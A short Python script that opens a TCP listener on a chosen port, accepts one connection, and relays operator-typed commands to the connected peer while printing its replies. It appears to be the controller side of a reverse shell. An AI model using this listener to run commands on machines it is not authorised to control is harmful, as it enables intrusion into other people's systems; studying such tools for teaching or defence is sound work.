import socket, sys

class Server:
    def __init__(self, ip = '', port = 8080):
        self.mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ip = ip
        self.port = port
        self.server = (ip, port)

    def accept(self):
        self.mysocket.bind(self.server)
        self.mysocket.listen(2)
        print(f"Listening on {self.ip}:{self.port}")
        conc, endpoint = self.mysocket.accept()
        endpoint = f"{endpoint[0]}:{endpoint[1]}"
        print(f"Connection Established with {endpoint}!")
        while True:
            command = input(f"{endpoint} > ")
            if command == 'exit':
                break
            conc.send(command.encode())
            print(conc.recv(10000).decode("latin-1"))
        self.mysocket.close()

def main():
   port = int(sys.argv[1])
   server = Server(port=port)
   server.accept()

if __name__ == '__main__':
    main()
